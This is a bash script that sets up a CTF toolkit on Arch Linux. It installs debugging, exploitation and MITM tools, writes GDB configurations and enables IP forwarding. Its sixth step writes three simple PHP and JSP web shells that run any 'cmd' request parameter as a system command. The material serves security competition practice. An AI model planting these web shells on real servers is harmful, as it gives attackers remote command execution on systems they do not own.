#!/bin/bash
# CTF Arsenal Setup for Arch Linux with paru
# Optimized for TUI/CLI tools (with optional GUI)

set -e

echo "=== CTF Arsenal Setup for Arch Linux (paru) ==="
echo ""

BASE_DIR="$PWD"

if [ ! -d "$BASE_DIR/00_templates" ]; then
	echo "Error: Run this script from ctf-arsenal/ directory"
	exit 1
fi

# 檢查 paru
if ! command -v paru &>/dev/null; then
	echo "Error: paru not found. Install it first:"
	echo "  sudo pacman -S --needed base-devel git"
	echo "  git clone https://aur.archlinux.org/paru.git && cd paru && makepkg -si"
	exit 1
fi

echo "[1/7] Installing core CTF tools (TUI/CLI focus)..."

# 必須安裝的工具 (extra repo)
CORE_TOOLS="gdb pwndbg gef peda ettercap socat tcpdump python-scapy ropper"

echo "  Installing: $CORE_TOOLS"
paru -S --needed --noconfirm $CORE_TOOLS

echo ""
echo "[2/7] Optional GUI tools (press Enter to skip, or wait 5s to install)..."
GUI_TOOLS="ettercap-gtk wireshark-qt"

read -t 5 -p "Install GUI tools? [$GUI_TOOLS] [y/N] " response || response="n"
if [[ "$response" =~ ^[Yy]$ ]]; then
	paru -S --needed --noconfirm $GUI_TOOLS
	echo "  ✓ GUI tools installed"
else
	echo "  ⊘ Skipped GUI tools (TUI/CLI only)"
fi

echo ""
echo "[3/7] Installing Ruby gems..."
if ! gem list | grep -q one_gadget; then
	sudo gem install one_gadget
	echo "  ✓ Installed one_gadget"
else
	echo "  ✓ one_gadget already installed"
fi

if ! gem list | grep -q seccomp-tools; then
	sudo gem install seccomp-tools
	echo "  ✓ Installed seccomp-tools"
else
	echo "  ✓ seccomp-tools already installed"
fi

echo ""
echo "[4/7] Verifying Python packages..."
python3 -c "from pwn import *" 2>/dev/null && echo "  ✓ pwntools OK" || {
	echo "  ! pwntools missing, installing..."
	paru -S --needed python-pwntools
}

python3 -c "from scapy.all import *" 2>/dev/null && echo "  ✓ scapy OK" || {
	echo "  ! scapy missing, installing..."
	paru -S --needed python-scapy
}

python3 -c "import requests" 2>/dev/null && echo "  ✓ requests OK" || {
	echo "  ! requests missing, installing..."
	paru -S --needed python-requests
}

python3 -c "import bs4" 2>/dev/null && echo "  ✓ beautifulsoup4 OK" || {
	echo "  ! beautifulsoup4 missing, installing..."
	paru -S --needed python-beautifulsoup4
}

echo ""
echo "[5/7] Setting up GDB configuration..."

# 備份現有 .gdbinit
if [ -f ~/.gdbinit ]; then
	echo "  Backing up existing ~/.gdbinit to ~/.gdbinit.backup"
	cp ~/.gdbinit ~/.gdbinit.backup
fi

# 建立 GDB 設定檔選項
mkdir -p 01_bin_exploit/gdb_init

cat >01_bin_exploit/gdb_init/gdbinit-pwndbg <<'EOF'
source /usr/share/pwndbg/gdbinit.py
set disassembly-flavor intel
set context-sections regs disasm stack backtrace
EOF

cat >01_bin_exploit/gdb_init/gdbinit-gef <<'EOF'
source /usr/share/gef/gef.py
set disassembly-flavor intel
gef config context.layout "legend regs stack code args source memory trace extra"
EOF

cat >01_bin_exploit/gdb_init/gdbinit-peda <<'EOF'
source /usr/share/peda/peda.py
set disassembly-flavor intel
EOF

echo ""
echo "  Select GDB enhancement (recommended: pwndbg for CTF):"
echo "    1) pwndbg (recommended - best for CTF)"
echo "    2) gef (multi-arch support)"
echo "    3) peda (classic, good pattern generation)"
echo "    4) Skip (configure manually later)"
echo ""
read -t 10 -p "Choice [1-4, default=1]: " gdb_choice || gdb_choice="1"

case $gdb_choice in
1)
	cp 01_bin_exploit/gdb_init/gdbinit-pwndbg ~/.gdbinit
	echo "  ✓ Configured pwndbg in ~/.gdbinit"
	;;
2)
	cp 01_bin_exploit/gdb_init/gdbinit-gef ~/.gdbinit
	echo "  ✓ Configured gef in ~/.gdbinit"
	;;
3)
	cp 01_bin_exploit/gdb_init/gdbinit-peda ~/.gdbinit
	echo "  ✓ Configured peda in ~/.gdbinit"
	;;
*)
	echo "  ⊘ Skipped GDB configuration"
	echo "  To configure later:"
	echo "    cp 01_bin_exploit/gdb_init/gdbinit-pwndbg ~/.gdbinit"
	;;
esac

echo ""
echo "[6/7] Setting up web shells and payloads..."
mkdir -p 03_web/webshells

cat >03_web/webshells/php-simple.php <<'EOF'
<?php system($_GET['cmd']); ?>
EOF

cat >03_web/webshells/php-full.php <<'EOF'
<?php
if(isset($_REQUEST['cmd'])) {
    echo "<pre>";
    system($_REQUEST['cmd']." 2>&1");
    echo "</pre>";
}
?>
EOF

cat >03_web/webshells/jsp-simple.jsp <<'EOF'
<%@ page import="java.io.*" %>
<%
if (request.getParameter("cmd") != null) {
    Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    InputStream in = p.getInputStream();
    int i;
    while ((i = in.read()) != -1) {
        out.write(i);
    }
}
%>
EOF

echo "  ✓ Created web shells (php, jsp)"

echo ""
echo "[7/7] Enabling IP forwarding (for ICS/MITM challenges)..."
current_forward=$(sysctl -n net.ipv4.ip_forward)
if [ "$current_forward" = "0" ]; then
	sudo sysctl -w net.ipv4.ip_forward=1
	echo "  ✓ IP forwarding enabled"
	echo "  Note: This is temporary. To persist, add to /etc/sysctl.conf:"
	echo "    net.ipv4.ip_forward = 1"
else
	echo "  ✓ IP forwarding already enabled"
fi

echo ""
echo "==================================================================="
echo "===               🎉 Setup Complete!                           ==="
echo "==================================================================="
echo ""

echo "📦 Installed tools:"
echo "  ✓ GDB $(gdb --version 2>&1 | head -1 | cut -d' ' -f4-)"
echo "  ✓ pwndbg $(paru -Q pwndbg 2>/dev/null | cut -d' ' -f2 || echo '(check manually)')"
echo "  ✓ gef $(paru -Q gef 2>/dev/null | cut -d' ' -f2 || echo '(check manually)')"
echo "  ✓ peda $(paru -Q peda 2>/dev/null | cut -d' ' -f2 || echo '(check manually)')"
echo "  ✓ ettercap $(ettercap --version 2>&1 | head -1 | cut -d' ' -f3)"
echo "  ✓ Bettercap $(paru -Q bettercap 2>/dev/null | cut -d' ' -f2) [Already installed]"
echo "  ✓ ropper $(paru -Q ropper 2>/dev/null | cut -d' ' -f2)"
echo "  ✓ socat, tcpdump, nmap"
echo ""

echo "🐍 Python packages:"
python3 -c "from pwn import *; print('  ✓ pwntools', pwnlib.__version__)"
python3 -c "from scapy.all import *; print('  ✓ scapy OK')" 2>/dev/null
python3 -c "import requests; print('  ✓ requests', requests.__version__)"
echo ""

echo "💎 Ruby gems:"
gem list | grep -E "one_gadget|seccomp" | sed 's/^/  ✓ /'
echo ""

echo "🎯 Quick Start:"
echo "  1. Test pwntools:  python3 00_templates/pwn_basic.py"
echo "  2. Test GDB:       gdb --quiet"
echo "  3. Test ettercap:  sudo ettercap -T -h"
echo "  4. Test bettercap: sudo bettercap -eval 'help'"
echo ""

echo "📖 Documentation:"
echo "  - README.md           (Project overview)"
echo "  - SYSTEM_CHECK.md     (Installed tools checklist)"
echo "  - cheat_sheets/       (Quick reference guides)"
echo "    └── ettercap_usage.md  (⚠️ ICS challenge - must read!)"
echo ""

echo "⚙️  Configuration:"
echo "  - GDB config: ~/.gdbinit"
echo "  - Alternative configs: 01_bin_exploit/gdb_init/"
echo "  - IP forwarding: $(sysctl -n net.ipv4.ip_forward) (1=enabled)"
echo ""

echo "🔍 Tools comparison (for reference):"
echo "  MITM:    ettercap (official tool) | bettercap (modern, TUI)"
echo "  GDB:     pwndbg (CTF best) | gef (multi-arch) | peda (classic)"
echo "  Packets: scapy (Python) | tshark (CLI) | wireshark (GUI)"
echo ""

echo "Ready for CTF! 🚀"
